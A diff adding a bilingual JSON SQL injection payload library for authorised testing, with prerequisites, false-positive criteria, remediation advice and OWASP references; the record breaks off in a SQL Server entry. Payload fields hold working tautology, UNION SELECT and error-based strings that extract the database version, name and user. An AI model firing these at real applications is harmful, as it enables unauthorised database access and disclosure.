@@ -1,0 +1,2593 @@
+{
+  "schemaVersion": 1,
+  "contentStandard": 2,
+  "sourcePrefix": "sqli2",
+  "entries": [
+    {
+      "id": "sqli2-",
+      "prerequisites": [
+        {
+          "zh": "使用自有测试环境和可回滚数据集，并能在应用日志或数据库审计中关联每次请求与最终 SQL。",
+          "en": "Use an owned test environment with a reversible dataset, and correlate each request with the final SQL through application logs or database auditing."
+        },
+        {
+          "zh": "先确认参数处于字符串、数字还是括号上下文，并保存正常输入及结构相同的恒真、恒假对照响应。",
+          "en": "First identify whether the parameter is in a string, numeric, or parenthesized context, and retain normal, structurally matched true, and false control responses."
+        }
+      ],
+      "analysis": {
+        "zh": "阳性证据是某个最小闭合形式让恒真与恒假谓词稳定产生不同的行集、状态或业务结果，同时后端记录显示输入进入了查询结构。单独出现引号报错、一次 500、响应长度抖动、WAF 告警或页面回显原始字符串都属于假阳性边界。",
+        "en": "Positive evidence is a minimal closure that makes matched true and false predicates reproducibly produce different rows, status, or business results while backend records show input entering query structure. A quote error, one HTTP 500, response-length jitter, a WAF alert, or reflection of the raw string alone is a false positive."
+      },
+      "opsecTips": [
+        {
+          "zh": "识别出一个可重复的闭合方式和真/假差异后立即停止，不再尝试额外注释、嵌套深度或数据读取。",
+          "en": "Stop as soon as one repeatable closure and true/false differential is identified; do not continue with extra comments, nesting depths, or data reads."
+        },
+        {
+          "zh": "回滚测试行，清除请求关联标记和临时详细错误输出，并恢复参数化查询与原有日志级别。",
+          "en": "Roll back test rows, clear request-correlation markers and temporary verbose errors, and restore parameterized queries and the original logging level."
+        }
+      ],
+      "name": {
+        "zh": "SQL 注入边界探测",
+        "en": "SQL Injection Boundary Probes"
+      },
+      "description": {
+        "zh": "用于识别字符串、数字和括号上下文中的 SQL 语法边界，通过成对真假条件判断输入是否改变后端查询结构。",
+        "en": "Identifies SQL syntax boundaries in string, numeric, and parenthesized contexts by comparing paired true and false predicates for evidence that input changed the backend query."
+      },
+      "category": {
+        "zh": "SQL/NoSQL注入",
+        "en": "SQL/NoSQL Injection"
+      },
+      "subCategory": {
+        "zh": "基础语法边界探测",
+        "en": "Basic Syntax-Boundary Probing"
+      },
+      "tutorial": {
+        "overview": {
+          "zh": "SQL 注入边界探测聚焦覆盖引号、注释符、括号和恒真条件；用途是定位闭合方式，而不是把一次异常响应直接当作 SQL 注入结论。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。",
+          "en": "SQL Injection Boundary Probes focuses on this boundary: Covers quotes, comments, parentheses, and always-true predicates to locate the closing context rather than treating one anomalous response as proof. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control."
+        },
+        "vulnerability": {
+          "zh": "应用把不可信值直接拼进 SQL 文本，使输入能够关闭原字面量或表达式并追加布尔逻辑；宽松类型与多层解码会扩大差异。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。",
+          "en": "The application concatenates untrusted values into SQL text, allowing input to close a literal or expression and append Boolean logic; weak typing and layered decoding amplify the gap. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone."
+        },
+        "exploitation": {
+          "zh": "先记录合法值，再按字段类型逐个测试引号或括号闭合，并用结构一致的恒真与恒假条件组成对照。 只有实际业务记录、授权对象或数据库日志中的最终查询出现可重复差异，才能确认；页面字数和单次错误都不足以证明。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。",
+          "en": "Record a valid value first, then test quote or parenthesis closure appropriate to the field type with structurally identical true and false controls. Confirm only when business records, authorized objects, or the final query in database logs differ reproducibly; page length and one error are insufficient. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain."
+        },
+        "mitigation": {
+          "zh": "所有数据值使用预编译语句或参数化 API，整数、枚举和标识符分别执行严格类型与允许列表校验，并统一外部数据库错误。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。",
+          "en": "Use prepared statements or parameterized APIs, validate integers and enums strictly, allowlist identifiers, and normalize external database errors. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone."
+        },
+        "difficulty": "beginner"
+      },
+      "attackChain": [
+        {
+          "title": {
+            "zh": "确认基础语法边界探测前置条件",
+            "en": "Confirm Basic Syntax-Boundary Probing prerequisites"
+          },
+          "description": {
+            "zh": "覆盖引号、注释符、括号和恒真条件；用途是定位闭合方式，而不是把一次异常响应直接当作 SQL 注入结论。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。",
+            "en": "Covers quotes, comments, parentheses, and always-true predicates to locate the closing context rather than treating one anomalous response as proof. Record the database product, version, driver, field type, normal response, and server-log baseline."
+          }
+        },
+        {
+          "title": {
+            "zh": "执行受控基础语法边界探测探针",
+            "en": "Run a controlled Basic Syntax-Boundary Probing probe"
+          },
+          "description": {
+            "zh": "先记录合法值，再按字段类型逐个测试引号或括号闭合，并用结构一致的恒真与恒假条件组成对照。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。",
+            "en": "Record a valid value first, then test quote or parenthesis closure appropriate to the field type with structurally identical true and false controls. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request."
+          },
+          "payload": "'\n\"\n`\n\\\nadmin'--\nadmin' #\nadmin'/*\n' or 1=1--\n' or 1=1#\n' or 1=1/*\n') or '1'='1--\n') or ('1'='1--\n' or '1'='1\n' or '1'='1'--\n' or '1'='1'#\n' or '1'='1'/*\n\" or \"1\"=\"1\n\" or \"1\"=\"1\"--\n\" or \"1\"=\"1\"#\n\" or \"1\"=\"1\"/*\nor 1=1\nor 1=1--\nor 1=1#\nor 1=1/*\n) or 1=1--\n) or 1=1#\n) or 1=1/*\n') or 1=1--\n') or 1=1#\n') or 1=1/*\n\") or 1=1--\n\") or 1=1#\n\") or 1=1/*\n' or 'x'='x\n\" or \"x\"=\"x\n' or ''='\n\" or \"\"=\"\nor true--\nor true#\nor true/*\n') or true--\n\") or true--\n1 or 1=1\n1' or 1=1--\n1\" or 1=1--\n1) or 1=1--\n1') or 1=1--\n1\") or 1=1--"
+        },
+        {
+          "title": {
+            "zh": "核对基础语法边界探测成功证据",
+            "en": "Verify Basic Syntax-Boundary Probing evidence"
+          },
+          "description": {
+            "zh": "只有实际业务记录、授权对象或数据库日志中的最终查询出现可重复差异，才能确认；页面字数和单次错误都不足以证明。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。",
+            "en": "Confirm only when business records, authorized objects, or the final query in database logs differ reproducibly; page length and one error are insufficient. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter."
+          }
+        },
+        {
+          "title": {
+            "zh": "修复并回归基础语法边界探测",
+            "en": "Remediate and regress Basic Syntax-Boundary Probing"
+          },
+          "description": {
+            "zh": "所有数据值使用预编译语句或参数化 API，整数、枚举和标识符分别执行严格类型与允许列表校验，并统一外部数据库错误。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。",
+            "en": "Use prepared statements or parameterized APIs, validate integers and enums strictly, allowlist identifiers, and normalize external database errors. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization."
+          }
+        }
+      ],
+      "references": [
+        "https://owasp.org/www-community/attacks/SQL_Injection",
+        "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
+      ],
+      "review": {
+        "decision": "payload",
+        "rationale": "这是确认 SQL 语法边界的请求载荷，不是 SQLMap 等工具命令。",
+        "issuesResolved": [
+          "corrected-name",
+          "corrected-description",
+          "reviewed-command-dialects",
+          "added-tutorial",
+          "rewrote-attack-chain",
+          "added-authoritative-references",
+          "defined-success-and-false-positive-evidence"
+        ]
+      }
+    },
+    {
+      "id": "sqli2-union",
+      "prerequisites": [
+        {
+          "zh": "确认测试查询存在可观察的返回列，并在测试表中放置不会与真实数据混淆的固定标记值。",
+          "en": "Confirm that the test query has an observable output column and place a fixed, unmistakable marker value in a test table."
+        },
+        {
+          "zh": "用 NULL 或常量在隔离环境中确定列数、顺序和类型兼容性，同时保留不含 UNION 的同参数基线。",
+          "en": "Determine column count, order, and type compatibility with NULLs or constants in isolation, while retaining the same parameter baseline without UNION."
+        }
+      ],
+      "analysis": {
+        "zh": "阳性要求响应中出现只能来自受控 UNION 分支的固定标记，且 SQL 审计确认兼容列结构已并入原查询。仅有列数错误、类型转换错误、普通页面数字、用户输入回显或猜中列数但没有标记行，都不能证明 UNION 注入。",
+        "en": "A positive result requires a fixed marker that can only originate from the controlled UNION branch to appear in the response, with SQL auditing confirming the compatible projection was merged into the original query. Column-count or type errors, ordinary page numbers, reflected input, or guessing the column count without a marker row do not prove UNION injection."
+      },
+      "opsecTips": [
+        {
+          "zh": "固定标记首次通过一个兼容列返回后停止，不继续枚举系统目录、用户表或敏感列。",
+          "en": "Stop after the fixed marker is returned through one compatible column; do not enumerate catalogs, user tables, or sensitive columns."
+        },
+        {
+          "zh": "删除标记行和临时视图，撤销为验证授予的 SELECT 权限，并清理页面缓存与关联查询日志中的测试值。",
+          "en": "Delete marker rows and temporary views, revoke SELECT grants added for validation, and clear the test value from page caches and correlated query logs."
+        }
+      ],
+      "name": {
+        "zh": "UNION 查询注入",
+        "en": "UNION Query Injection"
+      },
+      "description": {
+        "zh": "逐步匹配原查询列数与类型，将受控 UNION SELECT 行并入响应，以验证可见的查询结构注入。",
+        "en": "Progressively matches the original query's column count and types and merges a controlled UNION SELECT row into the response to validate visible query-structure injection."
+      },
+      "category": {
+        "zh": "SQL/NoSQL注入",
+        "en": "SQL/NoSQL Injection"
+      },
+      "subCategory": {
+        "zh": "UNION 查询注入",
+        "en": "UNION Query Injection"
+      },
+      "tutorial": {
+        "overview": {
+          "zh": "UNION 查询注入聚焦UNION 注入要求原结果可回显，且追加查询在列数、顺序和类型上兼容；应先使用 NULL 或固定标记绘制结构。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。",
+          "en": "UNION Query Injection focuses on this boundary: UNION injection requires reflected output and compatible column count, order, and types; map the shape first with NULL values or fixed markers. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control."
+        },
+        "vulnerability": {
+          "zh": "输入被拼进 SELECT 条件后，可以结束原谓词并追加集合运算；错误处理与模板回显会暴露列结构。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。",
+          "en": "Input concatenated into a SELECT predicate can terminate it and append a set operation, while errors and reflected templates expose the column shape. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone."
+        },
+        "exploitation": {
+          "zh": "从单列开始递增 NULL 占位符，保留列数不匹配的负对照，再将不同无害标记放入候选可见列。 标记必须稳定出现在服务端查询返回的数据位置，并排除请求反射、客户端渲染和缓存；真实数据读取不是确认所必需。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。",
+          "en": "Increment NULL placeholders from one column, retain a mismatched-count negative control, and place distinct harmless markers in candidate reflected columns. A marker must appear consistently in server-returned query data after excluding request reflection, client rendering, and caching; real-data access is unnecessary. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain."
+        },
+        "mitigation": {
+          "zh": "参数化所有过滤值，将动态排序、列名和表名映射到固定允许列表，并限制数据库账户只访问业务所需表列。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。",
+          "en": "Parameterize filter values, map dynamic sort keys and identifiers to fixed allowlists, and restrict the database account to required tables and columns. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone."
+        },
+        "difficulty": "intermediate"
+      },
+      "attackChain": [
+        {
+          "title": {
+            "zh": "确认UNION 查询注入前置条件",
+            "en": "Confirm UNION Query Injection prerequisites"
+          },
+          "description": {
+            "zh": "UNION 注入要求原结果可回显，且追加查询在列数、顺序和类型上兼容；应先使用 NULL 或固定标记绘制结构。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。",
+            "en": "UNION injection requires reflected output and compatible column count, order, and types; map the shape first with NULL values or fixed markers. Record the database product, version, driver, field type, normal response, and server-log baseline."
+          }
+        },
+        {
+          "title": {
+            "zh": "执行受控UNION 查询注入探针",
+            "en": "Run a controlled UNION Query Injection probe"
+          },
+          "description": {
+            "zh": "从单列开始递增 NULL 占位符，保留列数不匹配的负对照，再将不同无害标记放入候选可见列。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。",
+            "en": "Increment NULL placeholders from one column, retain a mismatched-count negative control, and place distinct harmless markers in candidate reflected columns. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request."
+          },
+          "payload": "' UNION SELECT 1--\n' UNION SELECT 1,2--\n' UNION SELECT 1,2,3--\n' UNION SELECT 1,2,3,4--\n' UNION SELECT 1,2,3,4,5--\n' UNION SELECT NULL--\n' UNION SELECT NULL,NULL--\n' UNION SELECT NULL,NULL,NULL--\n' UNION SELECT NULL,NULL,NULL,NULL--\n' UNION SELECT NULL,NULL,NULL,NULL,NULL--\nUNION SELECT 1\nUNION SELECT 1,2\nUNION SELECT 1,2,3\nUNION SELECT 1,2,3,4\nUNION SELECT 1,2,3,4,5\nUNION ALL SELECT 1\nUNION ALL SELECT 1,2\nUNION ALL SELECT 1,2,3\nUNION ALL SELECT 1,2,3,4\nUNION ALL SELECT 1,2,3,4,5\nUNION DISTINCT SELECT 1,2,3\nUNION DISTINCT SELECT 1,2,3,4\n1 UNION SELECT 1,2,3\n1' UNION SELECT 1,2,3--\n1\" UNION SELECT 1,2,3--\n1) UNION SELECT 1,2,3--\n1') UNION SELECT 1,2,3--\n1\") UNION SELECT 1,2,3--"
+        },
+        {
+          "title": {
+            "zh": "核对UNION 查询注入成功证据",
+            "en": "Verify UNION Query Injection evidence"
+          },
+          "description": {
+            "zh": "标记必须稳定出现在服务端查询返回的数据位置，并排除请求反射、客户端渲染和缓存；真实数据读取不是确认所必需。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。",
+            "en": "A marker must appear consistently in server-returned query data after excluding request reflection, client rendering, and caching; real-data access is unnecessary. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter."
+          }
+        },
+        {
+          "title": {
+            "zh": "修复并回归UNION 查询注入",
+            "en": "Remediate and regress UNION Query Injection"
+          },
+          "description": {
+            "zh": "参数化所有过滤值，将动态排序、列名和表名映射到固定允许列表，并限制数据库账户只访问业务所需表列。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。",
+            "en": "Parameterize filter values, map dynamic sort keys and identifiers to fixed allowlists, and restrict the database account to required tables and columns. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization."
+          }
+        }
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection",
+        "https://dev.mysql.com/doc/refman/8.4/en/union.html"
+      ],
+      "review": {
+        "decision": "payload",
+        "rationale": "UNION SELECT 是查询结构验证载荷，应保留在 Payload 库。",
+        "issuesResolved": [
+          "corrected-name",
+          "corrected-description",
+          "reviewed-command-dialects",
+          "added-tutorial",
+          "rewrote-attack-chain",
+          "added-authoritative-references",
+          "defined-success-and-false-positive-evidence"
+        ]
+      }
+    },
+    {
+      "id": "sqli2--ext",
+      "prerequisites": [
+        {
+          "zh": "从连接信息或服务端指纹确认具体 DBMS 与版本，只选择该版本实际支持的转换、XML、JSON、GTID 或空间函数。",
+          "en": "Confirm the exact DBMS and version from connection or server evidence, and select only conversion, XML, JSON, GTID, or spatial functions supported by that version."
+        },
+        {
+          "zh": "配置受控异常捕获并使用随机合成标记表达式，分别保存普通语法错误和不支持函数的对照。",
+          "en": "Configure controlled exception capture with a random synthetic marker expression, and retain separate controls for ordinary syntax errors and unsupported functions."
+        }
+      ],
+      "analysis": {
+        "zh": "阳性证据是兼容的报错函数执行了受控子表达式，并在数据库异常或经过授权的测试响应中携带预置标记。通用 SQL 错误、函数不存在、版本不兼容、网关统一 500、或错误文本只重复请求内容都是假阳性。",
+        "en": "Positive evidence is a compatible error function evaluating the controlled subexpression and carrying the preset marker in a database exception or authorized test response. A generic SQL error, missing function, incompatible version, uniform gateway 500, or error text that only repeats request content is a false positive."
+      },
+      "opsecTips": [
+        {
+          "zh": "一个低敏感固定标记进入错误通道后即停止，不把版本、当前用户或真实目录内容作为后续提取目标。",
+          "en": "Stop once one low-sensitivity fixed marker enters the error channel; do not proceed to extract versions, current users, or real catalog content."
+        },
+        {
+          "zh": "恢复通用错误页与异常脱敏设置，删除测试标记和详细堆栈记录，并关闭临时数据库跟踪。",
+          "en": "Restore generic error pages and exception redaction, delete test markers and verbose stack records, and disable temporary database tracing."
+        }
+      ],
+      "name": {
+        "zh": "跨数据库报错型 SQL 注入",
+        "en": "Cross-DBMS Error-Based SQL Injection"
+      },
+      "description": {
+        "zh": "覆盖 SQL Server 类型转换和 MySQL XML、JSON、GTID、地理函数等报错通道，用受控异常验证表达式执行。",
+        "en": "Covers SQL Server conversion errors and MySQL XML, JSON, GTID, and geospatial error channels to validate expression execution with controlled failures."
+      },
+      "category": {
+        "zh": "SQL/NoSQL注入",
+        "en": "SQL/NoSQL Injection"
+      },
+      "subCategory": {
+        "zh": "报错型 SQL 注入",
+        "en": "Error-Based SQL Injection"
+      },
+      "tutorial": {
+        "overview": {
+          "zh": "跨数据库报错型 SQL 注入聚焦集合横跨 SQL Server 与多个 MySQL 版本函数，必须先识别 DBMS 和版本，再选择兼容分支；不兼容函数错误不等于数据泄露。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。",
+          "en": "Cross-DBMS Error-Based SQL Injection focuses on this boundary: The set spans SQL Server and functions from several MySQL versions, so identify the DBMS and version before choosing a compatible branch; an unsupported-function error is not disclosure. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control."
+        },
+        "vulnerability": {
+          "zh": "输入进入数据库表达式且底层异常被原样返回或可区分映射，类型转换或函数校验错误便可能携带表达式结果。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。",
+          "en": "Input reaches a database expression while low-level exceptions are returned verbatim or mapped distinctly, allowing conversion or function-validation failures to carry expression results. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone."
+        },
+        "exploitation": {
+          "zh": "先比较正常表达式、固定类型错误和不存在函数三组响应，再只用与版本匹配的函数嵌入一个无害常量。 服务端异常日志必须稳定包含受控常量，并能对应到同一请求；普通语法错误、错误页变化或函数缺失都属于假阳性。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。",
+          "en": "Compare normal expression, fixed type error, and unknown-function responses, then embed one harmless constant using a function compatible with the confirmed version. Server exception logs must consistently contain the controlled constant and correlate to the request; syntax errors, changed error pages, or missing functions are false positives. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain."
+        },
+        "mitigation": {
+          "zh": "使用参数化查询隔离数据与表达式，统一生产错误响应，撤销不必要的函数和系统目录权限，并监控转换错误突增。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。",
+          "en": "Use parameterized queries, normalize production errors, revoke unnecessary function and catalog privileges, and monitor spikes in conversion failures. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone."
+        },
+        "difficulty": "advanced"
+      },
+      "attackChain": [
+        {
+          "title": {
+            "zh": "确认报错型 SQL 注入前置条件",
+            "en": "Confirm Error-Based SQL Injection prerequisites"
+          },
+          "description": {
+            "zh": "集合横跨 SQL Server 与多个 MySQL 版本函数，必须先识别 DBMS 和版本，再选择兼容分支；不兼容函数错误不等于数据泄露。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。",
+            "en": "The set spans SQL Server and functions from several MySQL versions, so identify the DBMS and version before choosing a compatible branch; an unsupported-function error is not disclosure. Record the database product, version, driver, field type, normal response, and server-log baseline."
+          }
+        },
+        {
+          "title": {
+            "zh": "执行受控报错型 SQL 注入探针",
+            "en": "Run a controlled Error-Based SQL Injection probe"
+          },
+          "description": {
+            "zh": "先比较正常表达式、固定类型错误和不存在函数三组响应，再只用与版本匹配的函数嵌入一个无害常量。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。",
+            "en": "Compare normal expression, fixed type error, and unknown-function responses, then embed one harmless constant using a function compatible with the confirmed version. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request."
+          },
+          "payload": "' AND 1=CONVERT(int,(SELECT @@version))--\n' AND 1=CONVERT(int,(SELECT database()))--\n' AND 1=CONVERT(int,(SELECT user()))--\n' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--\n' AND extractvalue(1,concat(0x7e,(SELECT database())))--\n' AND extractvalue(1,concat(0x7e,(SELECT user())))--\n' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)--\n' AND updatexml(1,concat(0x7e,(SELECT database())),1)--\n' AND updatexml(1,concat(0x7e,(SELECT user())),1)--\n' AND (SELECT 1 FROM(SELECT count(*),concat((SELECT @@version),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--\n' AND (SELECT 1 FROM(SELECT count(*),concat((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--\n' AND (SELECT 1 FROM(SELECT count(*),concat((SELECT user()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--\n' AND exp(~(SELECT * FROM (SELECT @@version)a))--\n' AND exp(~(SELECT * FROM (SELECT database())a))--\n' AND exp(~(SELECT * FROM (SELECT user())a))--\n' AND GTID_SUBSET((SELECT @@version),1)--\n' AND GTID_SUBSET((SELECT database()),1)--\n' AND JSON_KEYS((SELECT CONCAT(0x7e,(SELECT @@version))))--\n' AND JSON_KEYS((SELECT CONCAT(0x7e,(SELECT database()))))--\n' AND ST_LatFromGeoHash((SELECT CONCAT(0x7e,(SELECT @@version))))--\n' AND ST_LatFromGeoHash((SELECT CONCAT(0x7e,(SELECT database()))))--\n' AND ST_LongFromGeoHash((SELECT CONCAT(0x7e,(SELECT @@version))))--\n' AND ST_LongFromGeoHash((SELECT CONCAT(0x7e,(SELECT database()))))--\n' AND ELT(1=1,1)--\n' AND ELT(1=2,1)--\n' AND MAKE_SET(1=1,1)--\n' AND MAKE_SET(1=2,1)--"
+        },
+        {
+          "title": {
+            "zh": "核对报错型 SQL 注入成功证据",
+            "en": "Verify Error-Based SQL Injection evidence"
+          },
+          "description": {
+            "zh": "服务端异常日志必须稳定包含受控常量，并能对应到同一请求；普通语法错误、错误页变化或函数缺失都属于假阳性。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。",
+            "en": "Server exception logs must consistently contain the controlled constant and correlate to the request; syntax errors, changed error pages, or missing functions are false positives. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter."
+          }
+        },
+        {
+          "title": {
+            "zh": "修复并回归报错型 SQL 注入",
+            "en": "Remediate and regress Error-Based SQL Injection"
+          },
+          "description": {
+            "zh": "使用参数化查询隔离数据与表达式，统一生产错误响应，撤销不必要的函数和系统目录权限，并监控转换错误突增。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。",
+            "en": "Use parameterized queries, normalize production errors, revoke unnecessary function and catalog privileges, and monitor spikes in conversion failures. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization."
+          }
+        }
+      ],
+      "references": [
+        "https://owasp.org/www-community/attacks/SQL_Injection",
+        "https://learn.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql",
+        "https://dev.mysql.com/doc/refman/8.4/en/xml-functions.html"
+      ],
+      "review": {
+        "decision": "payload",
+        "rationale": "虽然跨 DBMS，但内容统一用于报错通道验证，属于 Payload 而非工具命令。",
+        "issuesResolved": [
+          "corrected-name",
+          "corrected-description",
+          "reviewed-command-dialects",
+          "added-tutorial",
+          "rewrote-attack-chain",
+          "added-authoritative-references",
+          "defined-success-and-false-positive-evidence"
+        ]
+      }
+    },
+    {
+      "id": "sqli2-mssql",
+      "prerequisites": [
+        {
+          "zh": "确认后端为 SQL Server，并记录驱动是否允许分号、多语句以及 WAITFOR 所在表达式位置。",
+          "en": "Confirm that the backend is SQL Server and record whether the driver permits semicolons, multiple statements, and the intended WAITFOR placement."
+        },
+        {
+          "zh": "在低权限测试库中建立带会话标记的审计和稳定延迟基线，使用短延时的恒真/恒假配对样本。",
+          "en": "Establish tagged-session auditing and a stable latency baseline in a low-privilege test database, using paired true and false samples with short delays."
+        }
+      ],
+      "analysis": {
+        "zh": "阳性可以是恒真分支相对恒假分支持续产生可统计的 WAITFOR 延迟并由 SQL Server 会话事件佐证，也可以是受控转换标记或 UNION 行被返回。单次超时、连接池排队、锁等待、语法错误或仅由 WAF 引入的延迟不是 SQL Server 注入证据。",
+        "en": "Positive evidence can be a statistically repeatable WAITFOR delay for the true branch versus the false branch corroborated by SQL Server session events, or a controlled conversion marker or UNION row being returned. One timeout, connection-pool queueing, lock waits, syntax errors, or delay introduced only by the WAF is not SQL Server injection evidence."
+      },
+      "opsecTips": [
+        {
+          "zh": "达到预设延迟置信度或看到一个受控标记后停止，并限制每个会话只保留一个最短 WAITFOR。",
+          "en": "Stop when the predefined timing confidence is reached or one controlled marker is observed, and permit only one shortest WAITFOR per session."
+        },
+        {
+          "zh": "取消仍在等待的会话，排空并重建测试连接池，删除临时对象和会话标记，再恢复原有查询超时。",
+          "en": "Cancel remaining waiting sessions, drain and rebuild the test connection pool, delete temporary objects and session tags, and restore the original query timeout."
+        }
+      ],
+      "name": {
+        "zh": "SQL Server 时间与 UNION 注入",
+        "en": "SQL Server Time and UNION Injection"
+      },
+      "description": {
+        "zh": "针对 SQL Server 的 WAITFOR DELAY、类型转换和 UNION 列结构探针，用时间、错误与回显三类证据确认注入。",
+        "en": "Targets SQL Server with WAITFOR DELAY, conversion errors, and UNION column probes, using timing, error, and reflected-output evidence."
+      },
+      "category": {
+        "zh": "SQL/NoSQL注入",
+        "en": "SQL/NoSQL Injection"
+      },
+      "subCategory": {
+        "zh": "Microsoft SQL Server 注入",
+        "en": "Microsoft SQL Server Injection"
+      },
+      "tutorial": {
+        "overview": {
+          "zh": "SQL Server 时间与 UNION 注入聚焦先确认 SQL Server，再依据驱动是否允许多语句选择 WAITFOR 的表达式或分号形式；延时次数必须受控以免阻塞连接池。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。",
+          "en": "SQL Server Time and UNION Injection focuses on this boundary: Confirm SQL Server first, then choose expression or semicolon WAITFOR forms according to driver multi-statement support; strictly limit delays to avoid pool exhaustion. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control."
+        },
+        "vulnerability": {
+          "zh": "输入拼入 T-SQL 条件或语句尾部时，可注入 WAITFOR、CONVERT 或 UNION；详细错误与多语句设置放大可观察信号。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。",
+          "en": "When input is concatenated into a T-SQL predicate or statement tail, WAITFOR, CONVERT, or UNION can be injected; detailed errors and multi-statement settings amplify signals. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone."
+        },
+        "exploitation": {
+          "zh": "采集多次正常请求计算中位数与抖动，之后只发送一次短 WAITFOR；若不稳定，则改用固定 CONVERT 错误或 NULL 列探针。 时间信号需重复统计并关联 SQL Server 会话，错误或 UNION 信号需对应最终 T-SQL；一次慢响应不能证明盲注。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。",
+          "en": "Collect repeated normal requests for median and jitter, then send one short WAITFOR; if unstable, use a fixed CONVERT error or NULL-column probe. Timing requires repeated statistics and SQL Server session correlation, while error or UNION evidence must match final T-SQL; one slow response proves nothing. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain."
+        },
+        "mitigation": {
+          "zh": "使用参数化 T-SQL 和类型化存储过程参数，关闭不需要的多语句能力，执行最小权限并监控 WAITFOR 与异常 UNION。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。",
+          "en": "Use parameterized T-SQL and typed stored-procedure parameters, disable unnecessary multi-statements, apply least privilege, and monitor WAITFOR and anomalous UNION use. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone."
+        },
+        "difficulty": "advanced"
+      },
+      "attackChain": [
+        {
+          "title": {
+            "zh": "确认Microsoft SQL Server 注入前置条件",
+            "en": "Confirm Microsoft SQL Server Injection prerequisites"
+          },
+          "description": {
+            "zh": "先确认 SQL Server，再依据驱动是否允许多语句选择 WAITFOR 的表达式或分号形式；延时次数必须受控以免阻塞连接池。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。",
+            "en": "Confirm SQL Server first, then choose expression or semicolon WAITFOR forms according to driver multi-statement support; strictly limit delays to avoid pool exhaustion. Record the database product, version, driver, field type, normal response, and server-log baseline."
+          }
+        },
+        {
+          "title": {
+            "zh": "执行受控Microsoft SQL Server 注入探针",
+            "en": "Run a controlled Microsoft SQL Server Injection probe"
+          },
+          "description": {
+            "zh": "采集多次正常请求计算中位数与抖动，之后只发送一次短 WAITFOR；若不稳定，则改用固定 CONVERT 错误或 NULL 列探针。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。",
